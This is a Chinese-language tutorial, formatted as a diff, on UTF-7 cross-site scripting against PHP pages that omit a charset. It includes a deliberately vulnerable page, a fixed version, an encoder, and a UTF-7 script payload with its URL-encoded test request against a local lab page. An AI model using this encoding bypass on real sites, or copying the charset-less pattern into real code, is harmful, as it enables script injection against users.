@@ -1,0 +1,94 @@
+UTF-7 XSS 浅析  
+
+vul.php
+
+<?php
+header('Content-Type: text/html');
+$string = $_GET["note"];
+echo htmlentities($string);//用htmlentities函数过滤
+?>
+
+sec.php
+
+<?php
+header('Content-Type: text/html;charset=UTF-8');
+$string = $_GET["note"];
+echo htmlentities($string);
+?>
+
+encode.php
+
+<?php header('Content-Type: text/html;charset=UTF-8');?>
+<html>
+<head>
+<title>UTF-7 XSS CODE Encoding</title>
+</head>
+<body>
+<center>
+<form action="" method="POST">
+XSS CODE:
+<input type="text" name="code" value="<script>alert('90sec')</script>" />
+<input type="submit"value="Encoding"></form>
+
+UTF-7 Bom(Byte Order Mark，字节序标记):
++/v8 | +/v9 | +/v+ | +/v/
+UTF-7 XSS Encode:
+<?php $encode = mb_convert_encoding($_POST[code],'UTF-7');?>//调用mb_convert_encoding()函数加密
+<?php echo $encode?>
+</center>
+</body>
+</html>
+
+vul.php 与 sec.php 不同在于 charset 的设置，如果没有设置 charset 那么它就是易受攻击的
+
+因为没有了编码的限制，我们可以使用另一种不常用的编码(UTF-7)来逃过xss的检测
+
+具体方法：
+
+1.先用我写的encode.php将xss代码进行加密
+
+XSS CODE: <script>alert('90sec')</script>
+
+UTF-7 XSS Encode:  +ADw-script+AD4-alert('90sec')+ADw-/script+AD4-
+
+2.将 UTF-7 XSS Encode 添上 UTF-7 Bom 让它成为 UTF-7 的编码
+
++/v8 +ADw-script+AD4-alert('90sec')+ADw-/script+AD4-
+
+Bom 与 Encode 之间有一个空格
+
+在bom与encode之间也可以存在其他代码，
+
+如：+/v8 just for fun +ADw-script+AD4-alert('90sec')+ADw-/script+AD4-
+
+3.如果是POST提交，就可以直接把 UTF-7 编码字符提交出去
+
+如果是GET方式，得先把编码字符进行URL转码，因为浏览器会吞掉+号，我就在这儿停了很久
+
++/v8 +ADw-script+AD4-alert('90sec')+ADw-/script+AD4-的URL代码
+
+%2B%2F%76%38%20%2B%41%44%77%2D%73%63%72%69%70%74%2B%41%44%34%2D%61%6C%65%72%74%28%27%39%30%73%65%63%27%29%2B%41%44%77%2D%2F%73%63%72%69%70%74%2B%41%44%34%2D
+
+测试vul.php：
+
+http://127.0.0.1/learn/vul.php?note=%2B%2F%76%38%20%2B%41%44%77%2D%73%63%72%69%70%74%2B%41%44%34%2D%61%6C%65%72%74%28%27%39%30%73%65%63%27%29%2B%41%44%77%2D%2F%73%63%72%69%70%74%2B%41%44%34%2D
+
+相关资料：
+
+http://shiflett.org/blog/2005/dec/google-xss-example
+
+http://shiflett.org/blog/2005/dec/googles-xss-vulnerability
+
+http://zh.wikipedia.org/zh-cn/UTF-7
+
+
+<?php
+ 
+header('Content-Type: text/html; charset=UTF-7');
+ 
+$string = "<script>alert('XSS');</script>";
+$string = mb_convert_encoding($string, 'UTF-7');
+ 
+echo htmlentities($string);
+ 
+?>
